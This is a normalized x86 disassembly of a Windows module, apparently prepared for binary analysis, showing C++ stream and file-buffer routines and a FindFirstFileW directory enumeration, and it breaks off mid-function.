push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000d29e
mov ecx [ esp + 0x28 ]
add esp 0x10
push eax
call sub_1000d138
push [ ebp + 0xc ]
mov esi [ eax ]
push [ ebp + 0x8 ]
mov edi [ eax + 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_1000d29e
add esp 0x10
push eax
push edi
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000d29e
add esp 0x10
push eax
mov ecx ebx
call sub_10001e10
jmp r-xdata
mov eax [ esp + 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_1000d357
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
push ebx
push esi
push edi
lea eax [ esp + 0x10 ]
push eax
mov esi ecx
call sub_10007bdc
mov edi [ eax ]
mov ebx [ eax + 0x4 ]
lea eax [ esp + 0x18 ]
push eax
mov ecx esi
call sub_10007bdc
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
push ebx
push edi
push [ eax + 0x4 ]
push [ eax ]
call sub_1000d2b5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_1000d39d
push ecx
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
test [ eax + 0x8 ] 0x6
jne r-xdata
mov eax esi
pop ecx
retn
mov eax [ eax + 0x28 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x30 ]
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
push 0x0
push 0x4
add edx esi
call sub_10007e2d
sub_1000d41d
push esi
mov esi [ esp + 0x8 ]
cmp esi [ esp + 0xc ]
je r-xdata
mov eax esi
pop esi
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_1001b6a9
mov [ esi ] al
inc esi
pop ecx
pop ecx
cmp esi [ esp + 0x10 ]
jne r-xdata
pop edi
sub_1000d45c
push esi
mov esi [ esp + 0x8 ]
cmp esi [ esp + 0xc ]
je r-xdata
mov eax esi
pop esi
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_1001c13d
mov [ esi ] al
inc esi
pop ecx
pop ecx
cmp esi [ esp + 0x10 ]
jne r-xdata
pop edi
sub_1000d4be
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
sub esi [ ebp + 0x8 ]
cmp [ ebp + 0x14 ] esi
jae r-xdata
push esi
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_1002005a
mov eax [ ebp + 0xc ]
add esp 0x10
pop esi
pop ebp
retn 0x10
call sub_1002059f
sub_1000d4ec
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub edx [ ebp + 0x8 ]
mov eax [ ecx ]
push edx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x28 ]
pop ebp
retn 0x10
sub_1000d512
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
sub esi [ ebp + 0x8 ]
cmp [ ebp + 0x18 ] esi
jae r-xdata
push esi
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
call sub_1002005a
mov eax [ ebp + 0xc ]
add esp 0x10
pop esi
pop ebp
retn 0x14
call sub_1002059f
sub_1000d540
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
lea eax [ ebp - 0x10 ]
mov edi ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_10007608
add edi 0x8
mov esi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
leave
retn 0x4
sub_1000d584
push 0x94
mov eax sub_10047a42
call sub_10023e33
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x2
pop eax
call sub_10023f0b
retn
cmp [ esi ] edi
jne r-xdata
push 0x18
call sub_10020186
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
mov [ ebp - 0x4 ] 0x1
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x10 ] 0x1
call sub_1000768f
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1000d565
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
mov [ ebp - 0x4 ] 0x2
test [ ebp - 0x10 ] 0x2
mov [ esi ] eax
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_1000d625
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1000d584
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_1000d6c2
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x30 ]
mov eax [ eax ]
jmp r-xdata
mov eax [ ecx ]
jmp [ eax + 0x14 ]
mov eax [ ecx + 0x30 ]
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x1 ]
mov [ ecx ] edx
movzx eax [ eax ]
retn
test eax eax
jle r-xdata
sub_1000d6ef
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
xor edx edx
mov edx [ ecx + 0x30 ]
mov edx [ edx ]
jmp r-xdata
mov eax [ ecx ]
jmp [ eax + 0x10 ]
mov eax [ eax ]
movzx eax [ eax ]
retn
test edx edx
jle r-xdata
sub_1000d70f
push 0x4
mov eax sub_1004a40b
call sub_10023e33
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
mov ecx [ eax + 0x8 ]
test ecx ecx
jne r-xdata
mov ecx [ eax + 0x8 ]
or ecx 0x2
cmp [ eax + 0x28 ] 0x0
jne r-xdata
mov eax [ eax + 0x2c ]
test eax eax
je r-xdata
push 0x0
push eax
call sub_10007d13
xor al al
or ecx 0x4
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi eax
call sub_1000d39d
mov al 0x1
jmp r-xdata
call sub_10023f0b
retn
sub_1000d78d
push esi
mov esi ecx
mov eax [ esi ]
call [ eax + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov eax [ esi + 0x20 ]
mov ecx [ eax ]
lea edx [ ecx + 0x1 ]
mov [ eax ] edx
movzx eax [ ecx ]
pop esi
retn
or eax eax
pop esi
retn
sub_1000d7b2
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x10 ] 0x0
push edi
mov edi ecx
jle r-xdata
mov eax [ ebp - 0x4 ]
pop edi
leave
retn 0xc
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
mov ecx [ edi + 0x30 ]
mov esi [ ecx ]
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x14 ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x10 ] esi
jge r-xdata
test esi esi
jle r-xdata
pop esi
pop ebx
mov [ ebx ] al
inc ebx
inc [ ebp - 0x4 ]
dec [ ebp + 0x10 ]
push esi
push [ eax ]
push [ ebp + 0xc ]
push ebx
call sub_10002477
mov eax [ edi + 0x30 ]
sub [ eax ] esi
mov eax [ edi + 0x20 ]
add [ ebp - 0x4 ] esi
sub [ ebp + 0x10 ] esi
add esp 0x10
add ebx esi
add [ eax ] esi
jmp r-xdata
mov esi [ ebp + 0x10 ]
mov eax [ edi + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
sub_1000d82d
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
push edi
mov edi ecx
jle r-xdata
mov eax [ ebp - 0x4 ]
pop edi
leave
retn 0x8
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor ecx ecx
mov ecx [ edi + 0x34 ]
mov ecx [ ecx ]
jmp r-xdata
movzx eax [ ebx ]
mov edx [ edi ]
push eax
mov ecx edi
call [ edx + 0x4 ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0xc ] ecx
mov esi ecx
jge r-xdata
test ecx ecx
jle r-xdata
pop esi
pop ebx
inc ebx
inc [ ebp - 0x4 ]
dec [ ebp + 0xc ]
push esi
push ebx
push ecx
push [ eax ]
call sub_10002477
mov eax [ edi + 0x34 ]
sub [ eax ] esi
mov eax [ edi + 0x24 ]
add [ ebp - 0x4 ] esi
sub [ ebp + 0xc ] esi
add esp 0x10
add ebx esi
add [ eax ] esi
jmp r-xdata
mov esi [ ebp + 0xc ]
mov eax [ edi + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
sub_1000d8e6
push esi
mov esi ecx
push edi
mov edi [ esi + 0x38 ]
mov [ esi ] r--data
test edi edi
je r-xdata
pop edi
lea ecx [ esi + 0x4 ]
pop esi
jmp sub_1001b08e
mov ecx edi
call sub_10007b41
push edi
call sub_1002004f
pop ecx
sub_1000d90f
push esi
lea esi [ ecx - 0x4 ]
lea eax [ esi + 0x4 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + eax - 0x4 ] r--data
push eax
mov [ eax ] r--data
call sub_1001b129
test [ esp + 0xc ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1000d954
push esi
lea esi [ ecx - 0x8 ]
lea eax [ esi + 0x8 ]
mov ecx [ eax - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + eax - 0x8 ] r--data
push eax
mov [ eax ] r--data
call sub_1001b129
test [ esp + 0xc ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1000d9a3
push 0xc
mov eax sub_1004907b
call sub_10023e33
mov esi ecx
mov [ ebp - 0x10 ] esi
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x24 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_1001c3b0
pop ecx
pop ecx
push 0x0
push 0x1
mov ecx esi
call sub_10002597
call sub_10023f0b
retn
sub_1000d9f1
push 0x4
mov eax sub_1004a3f0
call sub_10023e66
mov esi ecx
and [ esi ] 0x0
and [ ebp - 0x4 ] 0x0
push 0x10
call sub_10020186
pop ecx
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
inc ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ esi ] eax
mov eax esi
call sub_10023f0b
retn 0x4
sub_1000da4a
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
push edi
lea ecx [ esi + 0x4 ]
mov [ esi ] edi
call sub_1000d9f1
push edi
push edi
push esi
call sub_100289c4
add esp 0xc
pop edi
mov eax esi
pop esi
retn 0x4
sub_1000da90
push 0x4
mov eax sub_1004ab2f
call sub_10023e33
mov ebx ecx
mov [ ebp - 0x10 ] ebx
push 0x28
call sub_10020186
mov esi eax
pop ecx
test esi esi
je r-xdata
xor esi esi
mov ecx esi
call sub_1000da6f
and [ esi + 0x24 ] 0x0
jmp r-xdata
push esi
mov ecx ebx
call sub_1000da4a
and [ ebp - 0x4 ] 0x0
push 0x0
push [ ebp + 0x8 ]
push ebx
call sub_1001d700
add esp 0xc
mov eax ebx
call sub_10023f0b
retn 0x4
sub_1000daed
push 0x0
mov eax sub_10049655
call sub_10023e33
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_100020c6
push 0x0
push 0x1
lea ecx [ ebp + 0x8 ]
call sub_10002597
mov eax esi
call sub_10023f0b
retn 0x1c
sub_1000db54
push 0x2e4
mov eax sub_1004a3c8
call sub_10023e9c
xor esi esi
push r--data
lea ecx [ ebp - 0x2d4 ]
mov [ ebp - 0x2b4 ] edi
mov [ ebp - 0x2a0 ] esi
call sub_100012f3
lea eax [ ebp - 0x4c ]
push eax
lea ebx [ ebp - 0x2d4 ]
mov [ ebp - 0x4 ] 0x1
call sub_10012344
pop ecx
xor ebx ebx
push esi
inc ebx
push ebx
lea ecx [ ebp - 0x2d4 ]
mov [ ebp - 0x4 ] 0x3
call sub_10002597
push r--data
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x2f0 ]
push eax
call sub_10009652
push r--data
push eax
lea eax [ ebp - 0x30 ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_10009652
add esp 0x18
push esi
push ebx
lea ecx [ ebp - 0x2f0 ]
mov [ ebp - 0x4 ] 0x6
call sub_10002597
push 0x24c
lea eax [ ebp - 0x298 ]
push esi
push eax
mov [ ebp - 0x29c ] 0x250
call sub_100209e0
mov eax [ ebp - 0x2c ]
add esp 0xc
cmp [ ebp - 0x18 ] 0x8
jae r-xdata
lea ecx [ ebp - 0x29c ]
push ecx
push eax
call [ FindFirstFileW@IAT ]
mov [ ebp - 0x2b0 ] eax
cmp eax 0xffffffff
jne r-xdata
lea eax [ ebp - 0x2c ]
push 0x20
call sub_10020186
pop ecx
mov [ ebp - 0x2ac ] eax
mov [ ebp - 0x4 ] 0x7
cmp eax esi
je r-xdata
mov [ edi ] esi
mov [ edi + 0x4 ] esi
push esi
push ebx
lea ecx [ ebp - 0x30 ]
call sub_10002597
push esi
push ebx
jmp r-xdata
xor ebx ebx
push r--data
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x2d4 ]
push eax
call sub_10009652
sub esp 0x10
mov ecx esp
mov [ ebp - 0x2b8 ] esp
lea edx [ ebp - 0x270 ]
push edx
push eax
mov [ ebp - 0x4 ] 0x8
push ecx
mov [ ebp - 0x2a0 ] 0x2
call sub_10009652
mov esi [ ebp - 0x2ac ]
add esp 0xc
call sub_1000daed
mov ebx eax
xor esi esi
jmp r-xdata
lea ecx [ ebp - 0x4c ]
call sub_10002597
mov eax edi
call sub_10023f1f
retn
push [ ebp - 0x2b0 ]
call [ FindClose@IAT ]
mov eax [ ebp - 0x2a8 ]
mov [ edi ] eax
lea eax [ ebp - 0x2a4 ]
push eax
lea ecx [ edi + 0x4 ]
call sub_1000ad88
mov ecx [ ebp - 0x2a4 ]
or [ ebp - 0x2a0 ] 0x1
cmp ecx esi
je r-xdata
and [ ebp - 0x2a0 ] 0xfffffffd
push esi
push 0x1
lea ecx [ ebp - 0x2d4 ]
call sub_10002597
mov [ ebp - 0x4 ] 0x9
push ebx
lea ecx [ ebp - 0x2a4 ]
mov [ ebp - 0x2a8 ] ebx
call sub_1000eda6
push ebx
lea eax [ ebp - 0x2a8 ]
push ebx
push eax
call sub_100289c4
add esp 0xc
mov [ ebp - 0x4 ] 0x6
test [ ebp - 0x2a0 ] 0x2
je r-xdata
push esi
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_10002597
push esi
push 0x1
call sub_1000ad5c
sub_1000dd50
push 0xb4
mov eax sub_1004ab09
call sub_10023e33
mov esi ecx
xor ebx ebx
mov ecx edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x10 ] ebx
call sub_10007ee2
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x1c ] 0x8
mov [ ebp - 0x10 ] 0x1
jb r-xdata
add esi 0x8
mov esi [ esi + 0x8 ]
jmp r-xdata
lea eax [ ebp - 0xa8 ]
mov [ ebp - 0x4 ] bl
call sub_1000de1e
mov eax edi
call sub_10023f0b
retn
lea esi [ ebp - 0xa8 ]
call sub_1000ded5
lea esi [ ebp - 0xc0 ]
lea eax [ ebp - 0xa8 ]
call sub_1000df44
mov esi [ eax + 0x8 ]
add esi [ eax ]
sub esp 0x18
mov eax esp
mov [ eax ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] ebx
mov [ eax + 0x10 ] ebx
lea ebx [ ebp - 0xa8 ]
mov [ ebp - 0x14 ] esp
call sub_1000de56
push 0x0
push esi
mov ecx edi
call sub_1000c375
cmp [ edi + 0x18 ] 0x10
jb r-xdata
push esi
lea eax [ ebp - 0xa8 ]
push eax
call sub_1000df79
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x54 ] ebx
je r-xdata
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
push esi
push eax
lea eax [ ebp - 0xa8 ]
push eax
call sub_1000c9b3
xor ebx ebx
sub_1000de56
push ebp
mov ebp esp
mov eax [ ebx ]
mov edx [ eax + 0x4 ]
sub esp 0x18
push esi
push edi
push 0x6
pop ecx
test [ edx + ebx + 0x8 ] cl
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x4 ]
add eax ebx
mov ecx [ eax + 0x28 ]
neg ecx
sbb ecx ecx
and ecx 0xfffffffc
add ecx 0x4
push 0x1
sub esp 0x18
mov edi esp
mov eax edx
mov eax [ eax + ebx + 0x28 ]
mov edx [ eax ]
lea esi [ ebp + 0x8 ]
[ edi ] [ esi ]
lea ecx [ ebp - 0x18 ]
push ecx
mov ecx eax
call [ edx + 0x28 ]
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x10 ]
add ecx eax
cmp ecx [ r--data ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x4 ]
add eax ebx
mov ecx [ eax + 0x8 ]
or ecx 0x2
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x0
push eax
call sub_10007d13
pop edi
mov eax ebx
pop esi
leave
retn 0x18
or ecx 0x4
jmp r-xdata
sub_1000ded5
push ebp
mov ebp esp
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
sub esp 0x18
test [ ecx + esi + 0x8 ] 0x6
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov ecx [ eax + 0x28 ]
neg ecx
sbb ecx ecx
and ecx 0xfffffffc
add ecx 0x4
push 0x1
mov eax ecx
mov ecx [ eax + esi + 0x28 ]
mov eax [ ecx ]
push 0x2
push 0x0
lea edx [ ebp - 0x18 ]
push edx
call [ eax + 0x24 ]
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x10 ]
add ecx eax
cmp ecx [ r--data ]
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov ecx [ eax + 0x8 ]
or ecx 0x2
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x0
push eax
call sub_10007d13
mov eax esi
leave
retn
or ecx 0x4
jmp r-xdata
sub_1000df44
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add eax ecx
test [ eax + 0x8 ] 0x6
jne r-xdata
mov eax [ r--data ]
mov [ esi ] eax
xor eax eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov eax [ eax + 0x28 ]
mov edx [ eax ]
push 0x1
push 0x1
push 0x0
push esi
mov ecx eax
call [ edx + 0x24 ]
jmp r-xdata
mov eax esi
retn
sub_1000df79
push 0x4
mov eax sub_1004a336
call sub_10023e33
mov edi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
mov [ edi ] r--data
mov [ edi + 0x58 ] r--data
and [ ebp - 0x4 ] 0x0
lea esi [ edi + 0x8 ]
xor ebx ebx
push esi
inc ebx
push edi
mov [ ebp - 0x10 ] ebx
call sub_1000cace
mov [ ebp - 0x4 ] ebx
mov eax [ edi ]
mov eax [ eax + 0x4 ]
push esi
mov [ edi + eax ] r--data
call sub_1000cb0a
mov eax esi
mov [ esi ] r--data
mov [ esi + 0x48 ] 0x0
mov [ esi + 0x41 ] 0x0
call sub_1000cc45
mov eax [ rw-data ]
and [ esi + 0x4c ] 0x0
and [ esi + 0x3c ] 0x0
mov [ esi + 0x44 ] eax
push ebx
push [ ebp + 0xc ]
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_1000e885
test eax eax
jne r-xdata
mov eax edi
call sub_10023f0b
retn 0x8
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
mov ecx [ eax + 0x8 ]
or ecx 0x2
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x0
push eax
call sub_10007d13
or ecx 0x4
sub_1000e022
push 0x4
mov eax sub_10048e02
call sub_10023e33
mov [ ebp - 0x10 ] ecx
mov eax [ ecx - 0x58 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x58 ] r--data
and [ ebp - 0x4 ] 0x0
lea esi [ ecx - 0x50 ]
mov ecx esi
call sub_1000e061
mov eax [ esi - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x8 ] r--data
call sub_10023f0b
retn
sub_1000e061
push 0x4
mov eax sub_10048ddc
call sub_10023e33
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x48 ] 0x0
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_1000d8e6
call sub_10023f0b
retn
mov eax esi
call sub_1000e8ff
sub_1000e09a
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10048dac
mov eax [ fs : 0x0 ]
push eax
sub esp 0x58
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x68 ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
mov esi ecx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ esi + 0x24 ]
mov ecx [ eax ]
xor edi edi
cmp ecx edi
je r-xdata
xor eax eax
mov eax [ esi + 0x4c ]
cmp eax edi
jne r-xdata
mov eax [ esi + 0x34 ]
mov edx [ eax ]
add edx ecx
cmp ecx edx
jae r-xdata
cmp [ esi + 0x3c ] edi
jne r-xdata
or eax 0xffffffff
jmp r-xdata
dec [ eax ]
mov esi [ esi + 0x24 ]
mov eax [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov [ eax ] bl
push edi
push 0x8
lea ecx [ esp + 0x4c ]
mov [ esp + 0x1b ] bl
call sub_10005ad1
lea eax [ esp + 0x24 ]
push eax
lea ecx [ esp + 0x48 ]
mov [ esp + 0x74 ] edi
call sub_10007e4e
mov ecx eax
call sub_10006a85
mov edi [ esp + 0x58 ]
mov ebx eax
lea eax [ esp + 0x2c ]
push eax
lea ecx [ esp + 0x48 ]
call sub_10007e4e
mov ecx eax
call sub_10006a85
lea edx [ esp + 0x18 ]
add edi ebx
push edx
lea ebx [ esi + 0x44 ]
jmp r-xdata
push eax
movsx eax bl
push eax
call sub_100223bf
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esp + 0x68 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x50 ]
xor ecx esp
call sub_10020040
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esi + 0x3c ]
push edi
push eax
lea edx [ esp + 0x28 ]
push edx
lea edx [ esp + 0x24 ]
push edx
lea edx [ esp + 0x27 ]
push edx
mov [ esp + 0x2c ] eax
mov eax [ ecx ]
push ebx
call [ eax + 0x14 ]
test eax eax
jge r-xdata
jmp r-xdata
cmp eax 0x1
jg r-xdata
or esi 0xffffffff
mov eax ebx
jmp r-xdata
cmp eax 0x3
jne r-xdata
lea eax [ esp + 0x34 ]
push eax
lea ecx [ esp + 0x48 ]
call sub_10007e4e
mov ecx eax
call sub_10006a85
mov edi [ esp + 0x18 ]
sub edi eax
je r-xdata
movsx eax [ esp + 0x13 ]
push [ esi + 0x4c ]
push eax
call sub_100223bf
or esi 0xffffffff
pop ecx
pop ecx
cmp eax esi
je r-xdata
lea eax [ esp + 0x13 ]
mov [ esi + 0x41 ] 0x1
cmp [ esp + 0x1c ] eax
jne r-xdata
lea eax [ esp + 0x3c ]
push eax
lea ecx [ esp + 0x48 ]
call sub_10007e4e
mov ecx eax
call sub_10006a85
push [ esi + 0x4c ]
push edi
push 0x1
push eax
call sub_1002262d
add esp 0x10
cmp edi eax
jne r-xdata
push 0x0
push 0x1
lea ecx [ esp + 0x4c ]
call sub_100023ce
mov eax esi
jmp r-xdata
mov esi [ ebp + 0x8 ]
jmp r-xdata
test edi edi
ja r-xdata
lea eax [ esp + 0x24 ]
push eax
lea ecx [ esp + 0x48 ]
call sub_10007e4e
mov ecx eax
call sub_10006a85
mov edi [ esp + 0x58 ]
mov [ esp + 0x20 ] eax
lea eax [ esp + 0x2c ]
push eax
lea ecx [ esp + 0x48 ]
call sub_10007e4e
mov ecx eax
call sub_10006a85
lea edx [ esp + 0x18 ]
push edx
mov edx [ esp + 0x24 ]
add edi edx
cmp [ esp + 0x58 ] 0x20
jae r-xdata
push 0x0
push 0x8
lea ecx [ esp + 0x4c ]
call sub_10005af7
sub_1000e2b3
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
push ebx
mov ebx [ esp + 0x8 ]
test eax eax
je r-xdata
mov eax [ ecx + 0x4c ]
test eax eax
je r-xdata
mov edx [ ecx + 0x10 ]
cmp [ edx ] eax
jae r-xdata
or eax 0xffffffff
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
cmp [ ecx + 0x3c ] 0x0
jne r-xdata
mov eax [ ecx + 0x30 ]
inc [ eax ]
mov ecx [ ecx + 0x20 ]
dec [ ecx ]
mov eax ebx
inc eax
neg eax
sbb eax eax
and eax ebx
jmp r-xdata
movzx eax [ eax - 0x1 ]
cmp eax ebx
jne r-xdata
push eax
movzx eax bl
push eax
call sub_100227a0
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
pop ebx
retn 0x4
mov eax ebx
jmp r-xdata
sub_1000e318
push esi
mov esi ecx
mov eax [ esi + 0x20 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x14 ]
mov edi eax
or eax 0xffffffff
cmp edi eax
je r-xdata
mov edx [ esi + 0x30 ]
mov eax [ eax ]
mov edx [ edx ]
add edx eax
cmp eax edx
jae r-xdata
pop edi
pop esi
retn
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x8 ]
mov eax edi
movzx eax [ ecx ]
pop esi
retn
sub_1000e354
push 0x58
mov eax sub_10048d7f
call sub_10023e9c
mov esi ecx
mov eax [ esi + 0x20 ]
mov eax [ eax ]
xor edi edi
cmp eax edi
je r-xdata
mov eax [ esi + 0x4c ]
cmp eax edi
jne r-xdata
mov eax [ esi + 0x20 ]
mov ecx [ esi + 0x30 ]
mov eax [ eax ]
mov ecx [ ecx ]
add ecx eax
cmp eax ecx
jae r-xdata
cmp [ esi + 0x3c ] edi
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov esi [ esi + 0x20 ]
mov eax [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
movzx eax [ eax ]
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] 0xf
call sub_10002493
mov [ ebp - 0x4 ] edi
jmp r-xdata
push eax
call sub_10022812
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_10023f1f
retn
push [ esi + 0x4c ]
call sub_10022812
pop ecx
cmp eax 0xffffffff
jne r-xdata
movzx eax al
jmp r-xdata
push eax
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005af7
lea eax [ ebp - 0x44 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10007e4e
mov ecx eax
call sub_10006a85
mov edi [ ebp - 0x18 ]
mov ebx eax
lea eax [ ebp - 0x64 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10007e4e
mov ecx eax
call sub_10006a85
mov ecx [ esi + 0x3c ]
mov edx [ ecx ]
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2d ]
push eax
lea eax [ ebp - 0x34 ]
push eax
add edi ebx
push edi
push [ ebp - 0x38 ]
lea eax [ esi + 0x44 ]
push eax
call [ edx + 0x10 ]
test eax eax
jl r-xdata
or esi 0xffffffff
xor edi edi
inc edi
cmp eax edi
jle r-xdata
